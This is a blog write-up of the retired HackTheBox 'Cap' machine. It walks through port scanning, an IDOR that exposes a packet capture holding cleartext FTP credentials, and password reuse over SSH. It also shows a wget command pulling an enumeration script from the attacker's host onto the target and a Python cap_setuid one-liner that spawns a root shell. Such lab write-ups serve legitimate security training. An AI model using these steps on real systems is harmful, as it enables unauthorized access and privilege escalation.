---
title: "Cap Write-Up"
date: 2025-08-07T18:24:26-05:00
draft: false
author: Jarpiano
tags:
    - WriteUp
image: /images/cap-banner.png
description:
toc:
center: true
---
# Cap (Easy) Box
Cap is a retired easy box from HackTheBox. It provides a light introduction into IDOR and Linux capability exploitation.

## Initial Foothold
Let's start off with enumerating the ports. We can use `nmap` for this task.

```bash
nmap <TARGET-IP>
```

This gives us three open ports for numbers 21, 22, and 80 for `ftp`, `ssh`, and `http` respectively. We can browse to the http server and we should be able to get the following webpage when we click on `Security Snapshot` on the left sidebar.

<img src="/images/cap-image1.png" width="900" alt="Preview Image" />
<br>
<br>

The data shown there is `0` for all categories. 

For the next step, we're expecting a IDOR vulnerability, but, even if we weren't, we should enumerate the `URL` to identify any resources that could be vulnerable. We can use `ffuf` for this.

With this situation, however, this isn't required. If we look at the `URL` on the `/data/` URL, we see that it's a number. Whenever we exit that page and return to it, that number increments by 1. We should replace that URL entry with a `0` like the following:

```url
http://<TARGET-IP>/data/0
```

Now our webpage should look the same as above. If we click the download button, we can obtain the `.pcap` file and open it on our Wireshark program.

On Wireshark, a short scroll to the `ftp` protocol packet entries shows cleartext credentials for the user `nathan`. 

<img src="/images/cap-image2.png" width="900" alt="Preview Image" />
<br>
<br>

If it hasn't been changed yet, we can probably use these credentials for the `ftp` service on the server. However, passwords are often used across accounts so we should try it on the `ssh` service as well.

When we do so, we're able to obtain `nathan` user access on the machine. We can find the `user.txt` file in the home directory of the user.

## Privilege Escalation

We should enumerate the machine for any misconfigurations or outdated settings. This can be done with automated programs such as `LinEnum.sh` and `linpeas.sh`. Either works, but let's use `LinEnum`. The script can be found in [this](https://github.com/rebootuser/LinEnum) GitHub repository.

We can pull it to our local machine with `wget`:

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh
```

After that, let's set up a Python server on our attack host:

```bash
python3 -m http.server 4444
```

Now on our target machine, we can `wget` the `LinEnum.sh` file.

```bash
wget <MY-IP>:4444/LinEnum.sh
```

Now, adjust the execution permissions with `chmod +x` and execute the file. 

Going through the output, we can see that the `/usr/bin/python3.8` binary has the `cap_setuid` capability. This is a known misconfiguration that can be exploited for privilege escalation. We can refer to get [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities) for the escalation code:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

If we execute `whoami`, it should send back that we're now the `root` user.

From this point, we can navigate to the `/root` directory and `cat` our `root.txt` file to get the flag.

**Fin.**